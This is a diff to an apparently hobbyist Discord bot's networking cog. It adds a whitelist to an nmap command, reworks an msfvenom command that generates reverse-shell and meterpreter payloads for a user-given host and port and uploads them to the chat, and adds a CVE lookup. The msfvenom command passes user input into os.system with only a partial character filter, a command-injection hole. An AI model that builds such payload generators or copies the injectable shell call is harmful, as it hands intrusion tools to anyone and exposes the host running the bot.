@@ -31,6 +31,10 @@ def grab_banner(ip, port):
     connect.close()
     banners.append(banner)
 
+def nmap_whitelist(ctx):
+    whitelisted = [292382410530750466]
+    return ctx.author.id in whitelisted
+
 
 class networkingtools(commands.Cog):
     def __init__(self, client):
@@ -153,8 +157,8 @@ class networkingtools(commands.Cog):
 
 
     @commands.command(name="nmap", description="Performs basic scans using the nmap. The bot will be paused while this runs! ")
+    @commands.check(nmap_whitelist)
     async def nmapscan(self, ctx, scantype: str, ip: str):
-
         hostname = socket.gethostname()
         if ip == "127.0.0.1" or ip == "localhost" or ip == hostname:
             await ctx.send("I'm not gonna be scanning myself, sorry")
@@ -247,6 +251,8 @@ class networkingtools(commands.Cog):
     async def scan_error(self, ctx, error):
         if isinstance(error, commands.MissingRequiredArgument):
             await ctx.send("Please enter a scan type and IP")
+        elif isinstance(error, commands.CheckFailure):
+            await ctx.send("You are not whitelisted to use this command")
         else:
             raise
 
@@ -290,51 +296,89 @@ class networkingtools(commands.Cog):
             await ctx.send("Please enter an IP and ports to check")
 
     @commands.command(name="msfvenom", description="Geneate msf payload, for payloads type ./msfvenom options", aliases=["msfpayload"])
-    async def msfvenom(self, ctx, payload: str, ip: str, port: int):
-        if validate_ip(ip) is True:
-            if 1 <= port <= 65535:
-                bad_chars = [';', ':', '!', "*", '#']
-                payload = ''.join((filter(lambda i: i not in bad_chars, payload)))
-                payload = payload.lower()
-                if payload == "windows/meterpeter/reverse_tcp":
-                    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat")
-                    await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat"))
-                    os.remove(f"./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat")
-                elif payload == "windows/shell/reverse_tcp":
-                    os.system(f"msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat")
-                    await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat"))
-                    os.remove(f"./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat")
-                elif payload == "linux/x64/shell/reverse_tcp":
-                    os.system(f"msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf")
-                    await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf"))
-                elif payload == "linux/x32/shell/reverse_tcp":
-                    os.system(f"msfvenom -p linux/x32/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf")
-                    await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf"))
-                    os.system(f"msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf")
-                    os.remove(f"./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf")
-                elif payload == "options":
-                    await ctx.send("""Available payloads:
-                                        windows/meterpeter/reverse_tcp
-                                        windows/shell/reverse_tcp
-                                        linux/x64/shell/reverse_tcp
-                                        linux/x32/shell/reverse_tcp
-                                    Other payloads will be accepted in the same format and ouput as a txt
-                        """)
+    async def msfvenom(self, ctx, payload: str, ip = None, port = None):
+
+        if payload == "options":
+            await ctx.send("""```accesslog
+Usage: ./msfvenom [payload] [ip] [port]
+Available payloads:
+    windows/meterpeter/reverse_tcp
+    windows/shell/reverse_tcp
+    linux/x64/shell/reverse_tcp
+    linux/x32/shell/reverse_tcp
+    Other payloads will be accepted in the same format and ouput as a txt```
+                """)
+
+        if port != None:
+            try:
+                port = int(port)
+                port_check = True
+            except ValueError:
+                await ctx.send("Invalid port passed!")
+        if port_check == True:
+            if validate_ip(ip) is True:
+                if 1 <= port <= 65535:
+                    bad_chars = [';', ':', '!', '*', '#', '$', '(', ')']
+                    payload = ''.join((filter(lambda i: i not in bad_chars, payload)))
+                    payload = payload.lower()
+                    if payload == "windows/meterpeter/reverse_tcp":
+                        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat")
+                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat"))
+                        os.remove(f"./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat")
+                    elif payload == "windows/shell/reverse_tcp":
+                        os.system(f"msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat")
+                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat"))
+                        os.remove(f"./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat")
+                    elif payload == "linux/x64/shell/reverse_tcp":
+                        os.system(f"msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf")
+                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf"))
+                    elif payload == "linux/x32/shell/reverse_tcp":
+                        os.system(f"msfvenom -p linux/x32/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf")
+                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf"))
+                        os.system(f"msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf")
+                        os.remove(f"./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf")
+                    else:
+                        os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_payload.txt")
+                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_payload.txt"))
+                        os.remove(f"./payloads/{ctx.author.id}_payload.txt")
                 else:
-                    os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_payload.txt")
-                    await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_payload.txt"))
-                    os.remove(f"./payloads/{ctx.author.id}_payload.txt")
+                    print("Please enter a valid port")
             else:
-                print("Please enter a valid port")
-        else:
-            print("Please enter a  valid IP address")
+                print("Please enter a  valid IP address")
 
     @msfvenom.error
     async def msfvenom_error(self, ctx, error):
         if isinstance(error, commands.MissingRequiredArgument):
-            await ctx.send("Please enter a payload, IP and port. Use ./msfvenom options 1 1 for a list of avilable payloads")
-        elif isinstance(error, commands.BadArgument):
-            await ctx.send("Please enter a valid port")
+            await ctx.send("Please enter a payload, IP and port. Use ./msfvenom options for a list of avilable payloads")
+        else:
+            raise
+    @commands.command(name="cvesearch", description="Search", alises=["cveid", "cvelookup"])
+    async def cvesearch(self, ctx, cveid):
+        if cveid == "":
+            await ctx.send("Please provide a cve ID")
+        else:
+            url = "https://cve.circl.lu/api/cve/" + cveid
+            async with request("GET", url, headers={}) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    embed = Embed(title=f"Info on {cveid}",
+                                  description=f"Name: {data['capec'][0]['name']}",
+                                  colour=discord.Colour.random(),
+                                  inline=True)
+                    embed.add_field(name="Authentication: ", value=data['access']['authentication'], inline=True)
+                    embed.add_field(name="Complexity: ", value=data['access']['complexity'], inline=True)
+                    embed.add_field(name="Vector: ", value=data['access']['vector'], inline=True)
+                    embed.add_field(name="Summary: ", value=data['capec'][0]['summary'], inline=True)
+                    embed.add_field(name="Solutions: ", value=data['capec'][0]['solutions'], inline=True)
+
+                    time = ctx.message.created_at
+                    embed.set_footer(text=f"Asked by {ctx.author.name} " + time.strftime("%d/%m/%y %X"))
+
+                    await ctx.send(embed=embed)
+    @cvesearch.error
+    async def cves_error(self, ctx, error):
+        if isinstance(error, commands.MissingRequiredArgument):
+            await ctx.send("Please enter a CVE to search")
         else:
             raise
 
